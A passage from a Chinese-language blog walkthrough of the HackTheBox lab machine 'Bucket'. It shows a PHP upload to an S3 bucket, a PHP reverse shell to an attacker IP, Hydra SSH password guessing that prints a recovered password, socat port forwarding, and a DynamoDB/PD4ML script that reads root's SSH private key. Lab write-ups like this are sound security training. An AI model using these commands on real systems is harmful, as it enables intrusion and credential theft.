class=\"hljs-string\"\u003e'\u0026#x3C;?php phpinfo();?\u003e'\u003c/span\u003e \u003e test.php                                                                                                                         \n\n➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e test.php s3://adserver/test.php\nupload: ./test.php to s3://adserver/test.php \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以上传，但是貌似无法解析\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里看了下\u003ccode\u003eWP\u003c/code\u003e，之前进行目录扫描\u003ccode\u003es3\u003c/code\u003e的时候能扫描到\u003ccode\u003e/server-status\u003c/code\u003e ，那么该处和\u003ccode\u003ebucket.htb\u003c/code\u003e可能在同一目录下，而且可以支持解析 \u003ccode\u003ephp\u003c/code\u003e 拓展名\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eadserver\u003c/code\u003e 目录下没有\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里通过 \u003ccode\u003els\u003c/code\u003e 命令来查看 \u003ccode\u003eadserver\u003c/code\u003e文件夹内的文件，可以看到存在\u003ccode\u003eindex.html\u003c/code\u003e ，那么可能就是主站\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e s3://adserver                    \n                           PRE images/\n2025-06-06 15:48:02       5344 index.html\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.69/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e和之前一样的操作可以直接获得弹回来的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003e密码碰撞\u003c/h3\u003e\n\u003cp\u003e发现存在用户\u003ccode\u003eroy\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@bucket:/var/www$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\nroy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们使用的到的密码进行碰撞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC \u0026#x26; David Maciejak - Please \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not use \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e military or secret service organizations, or \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00\n[WARNING] Many SSH configurations \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task\n[DATA] attacking ssh://10.10.10.212:22/\n[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-\u0026#x3C;_K_Q:.Aa2\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功得到 \u003ccode\u003eRoy\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket ssh roy@10.10.10.212   \nroy@10.10.10.212\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 06 Jun 2025 07:52:46 AM UTC\n\n  System load:                      0.05\n  Usage of /:                       33.9% of 17.59GB\n  Memory usage:                     30%\n  Swap usage:                       0%\n  Processes:                        256\n  Users logged in:                  2\n  IPv4 address for br-bee97070fb20: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for ens160:          10.10.10.212\n  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55\n\n229 updates can be installed immediately.\n103 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Jun  6 06:08:21 2025 from 10.10.16.27\nroy@bucket:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录下能得到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n6e375b41aac41437da7b58d400a30c74\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003edb.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:~/project$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e db.php\n\u0026#x3C;?php\nrequire \u003cspan class=\"hljs-string\"\u003e'vendor/autoload.php'\u003c/span\u003e;\ndate_default_timezone_set(\u003cspan class=\"hljs-string\"\u003e'America/New_York'\u003c/span\u003e);\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n\u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e = new Aws\\Sdk([\n    \u003cspan class=\"hljs-string\"\u003e'profile'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'region'\u003c/span\u003e  =\u003e \u003cspan class=\"hljs-string\"\u003e'us-east-1'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'version'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'latest'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'endpoint'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'http://localhost:4566'\u003c/span\u003e\n]);\n\n\u003cspan class=\"hljs-variable\"\u003e$dynamodb\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e-\u003ecreateDynamoDb();\n\n//todo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e内部开放了好几个端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process\nudp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*\ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*\ntcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*\ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*\ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将 \u003ccode\u003e4566\u003c/code\u003e和 \u003ccode\u003e8000\u003c/code\u003e端口转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 \u0026#x26;\n[1] 145731\nroy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 \u0026#x26;\n[2] 145736\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 \u003ccode\u003e8000\u003c/code\u003e端口是貌似未完工的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e4566\u003c/code\u003e像是\u003ccode\u003es3\u003c/code\u003e的端点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试通过\u003ccode\u003eaws\u003c/code\u003e访问\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws --endpoint-url http://bucket.htb:4567 s3 \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n2025-06-06 16:04:01 adserver\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能是一个内部端点，尝试读取数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n{\n    \u003cspan class=\"hljs-string\"\u003e\"TableNames\"\u003c/span\u003e: [\n        \u003cspan class=\"hljs-string\"\u003e\"Music\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"users\"\u003c/span\u003e\n    ]\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eusers\u003c/code\u003e和我们在外部端点访问的一样，\u003ccode\u003eMusic\u003c/code\u003e是空的（可能其他人使用官方文档中的语句创建的），感觉就是之前的外部端点\u003c/p\u003e\n\u003ch3\u003eTo root\u003c/h3\u003e\n\u003cp\u003e回到\u003ccode\u003e8000\u003c/code\u003e端口，我们发现这是一个不小的项目，线路也可能在这里\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:/var/www/bucket-app$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\ncomposer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:/var/www$ getfacl bucket-app/\n\u003cspan class=\"hljs-comment\"\u003e# file: bucket-app/\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# owner: root\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# group: root\u003c/span\u003e\nuser::rwx\nuser:roy:r-x\ngroup::r-x\nmask::r-x\nother::---\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eindex.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroy@bucket:/var/www/bucket-app$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e index.php\n\u0026#x3C;?php\nrequire \u003cspan class=\"hljs-string\"\u003e'vendor/autoload.php'\u003c/span\u003e;\nuse Aws\\DynamoDb\\DynamoDbClient;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"REQUEST_METHOD\"\u003c/span\u003e]===\u003cspan class=\"hljs-string\"\u003e\"POST\"\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"action\"\u003c/span\u003e]===\u003cspan class=\"hljs-string\"\u003e\"get_alerts\"\u003c/span\u003e) {\n                date_default_timezone_set(\u003cspan class=\"hljs-string\"\u003e'America/New_York'\u003c/span\u003e);\n                \u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e = new DynamoDbClient([\n                        \u003cspan class=\"hljs-string\"\u003e'profile'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e,\n                        \u003cspan class=\"hljs-string\"\u003e'region'\u003c/span\u003e  =\u003e \u003cspan class=\"hljs-string\"\u003e'us-east-1'\u003c/span\u003e,\n                        \u003cspan class=\"hljs-string\"\u003e'version'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'latest'\u003c/span\u003e,\n                        \u003cspan class=\"hljs-string\"\u003e'endpoint'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'http://localhost:4566'\u003c/span\u003e\n                ]);\n\n                \u003cspan class=\"hljs-variable\"\u003e$iterator\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e-\u003egetIterator(\u003cspan class=\"hljs-string\"\u003e'Scan'\u003c/span\u003e, array(\n                        \u003cspan class=\"hljs-string\"\u003e'TableName'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'alerts'\u003c/span\u003e,\n                        \u003cspan class=\"hljs-string\"\u003e'FilterExpression'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e\"title = :title\"\u003c/span\u003e,\n                        \u003cspan class=\"hljs-string\"\u003e'ExpressionAttributeValues'\u003c/span\u003e =\u003e array(\u003cspan class=\"hljs-string\"\u003e\":title\"\u003c/span\u003e=\u003earray(\u003cspan class=\"hljs-string\"\u003e\"S\"\u003c/span\u003e=\u003e\u003cspan class=\"hljs-string\"\u003e\"Ransomware\"\u003c/span\u003e)),\n                ));\n\n                foreach (\u003cspan class=\"hljs-variable\"\u003e$iterator\u003c/span\u003e as \u003cspan class=\"hljs-variable\"\u003e$item\u003c/span\u003e) {\n                        \u003cspan class=\"hljs-variable\"\u003e$name\u003c/span\u003e=rand(1,10000).\u003cspan class=\"hljs-string\"\u003e'.html'\u003c/span\u003e;\n                        file_put_contents(\u003cspan class=\"hljs-string\"\u003e'files/'\u003c/span\u003e.\u003cspan class=\"hljs-variable\"\u003e$name\u003c/span\u003e,\u003cspan class=\"hljs-variable\"\u003e$item\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"data\"\u003c/span\u003e]);\n                }\n                passthru(\u003cspan class=\"hljs-string\"\u003e\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/\u003cspan class=\"hljs-variable\"\u003e$name\u003c/span\u003e 800 A4 -out files/result.pdf\"\u003c/span\u003e);\n        }\n}\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n{\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e逻辑大概是通过\u003ccode\u003ePOST\u003c/code\u003e方法访问，并且参数\u003ccode\u003eaction\u003c/code\u003e等于\u003ccode\u003eget_alerts\u003c/code\u003e 时，对数据进行连接，然后循环\u003ccode\u003ealerts\u003c/code\u003e表并筛选表达式中 \u003ccode\u003e:title\u003c/code\u003e 占位符的值，这里为 \"\u003ccode\u003eRansomware\u003c/code\u003e\"。再下面的循环上边筛选后的值，生成一个1到10000之间的随机数，并附加 \u003ccode\u003e.html\u003c/code\u003e 后缀，作为 HTML 文件名，并将筛选后的值的\u003ccode\u003edata\u003c/code\u003e写入\u003ccode\u003eHTML\u003c/code\u003e 文件。暗示了你的 DynamoDB \u003ccode\u003ealerts\u003c/code\u003e 表中的项目的 \u003ccode\u003edata\u003c/code\u003e 属性存储的是 HTML 内容。\u003c/p\u003e\n\u003cp\u003e最后一行，调用了\u003ccode\u003epd4ml_demo.jar\u003c/code\u003e ，提供用于 HTML 到 PDF 转换的基本 Java API，包括 PD4ML JSP 标签库。\u003c/p\u003e\n\u003cp\u003e那么最后一句就是将生成\u003ccode\u003eHTML\u003c/code\u003e文件钻换成\u003ccode\u003ePDF\u003c/code\u003e文件，并存放在\u003ccode\u003efiles/result.pdf\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们观察\u003ccode\u003efiles\u003c/code\u003e文件夹没有任何文件产生，应该是表\u003ccode\u003ealerts\u003c/code\u003e不存在，我们首先创建\u003ccode\u003ealerts\u003c/code\u003e表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eaws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eaws dynamodb tables-list --endpoint-url http://bucket.htb:4567\n{\n    \u003cspan class=\"hljs-string\"\u003e\"TableNames\"\u003c/span\u003e: [\n        \u003cspan class=\"hljs-string\"\u003e\"Music\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"alerts\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"users\"\u003c/span\u003e\n    ]\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我们能发现一会后，\u003ccode\u003ealerts\u003c/code\u003e表就会被删除，所以我们要通过脚本来执行操作\u003c/p\u003e\n\u003cp\u003e尝试包含文件，这里我们查看\u003ccode\u003epd4ml\u003c/code\u003e的文档，其中有一项是添加附件：\u003ca href=\"https://pd4ml.com/support-topics/usage-examples/#add-attachment\"\u003ehttps://pd4ml.com/support-topics/usage-examples/#add-attachment\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;html\u003e\u0026#x3C;pd4ml:attachment style=\\\"align: right\\\" \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\\\"paperclip\\\" src=\\\"/root/root.txt\\\"/\u003e\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'create table alerts\\n'\u003c/span\u003e\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\n\u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 2;\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'create talbe success?\\n'\u003c/span\u003e\naws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n\u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 2;\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Insert data:\\n'\u003c/span\u003e\naws dynamodb put-item \\\n    --table-name alerts  \\\n    --item \\\n        \u003cspan class=\"hljs-string\"\u003e'{\"title\": {\"S\": \"Ransomware\"}, \"data\": {\"S\": \"\u0026#x3C;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\"\u003efile:///root/.ssh/id_rsa\u0026#x3C;/pd4ml:attachment\u003e\"}}'\u003c/span\u003e \\\n    --endpoint-url http://bucket.htb:4567\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'POST endpoint \u0026#x26;\u0026#x26; copy the file'\u003c/span\u003e\ncurl http://bucket.htb:8001 -X POST -d \u003cspan class=\"hljs-string\"\u003e'action=get_alerts'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003eresult.pdf\u003c/code\u003e ，能拿到私钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU\n......\npHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/\nlt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1\nxMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过私钥登录后，读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@bucket:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n880bb2407bd062f1f9896875e8d049bf\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e又一次感到自己是真的无耐心…一烦躁起来就无法思考。。这次碰到新东西，卡了还是蛮久的，不过利用都没什么挡住的地方，除了最后的读取文件。\u003c/p\u003e\n\u003cp\u003e学习到了 \u003ccode\u003eAWS S3\u003c/code\u003e，以及一些\u003ccode\u003eDynamodb\u003c/code\u003e 的知识\u003c/p\u003e","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","updated":"2025-06-06","tags":["HackTheBox","Linux","AWS_S3","Dynamodb","PD4ML"],"categories":"靶机","comments":true,"description":"Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"06","day":"06","id":"HackTheBoxMachine - Bucket"},"buildId":"rYHkFZPcHeH30wRPpLsoD","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>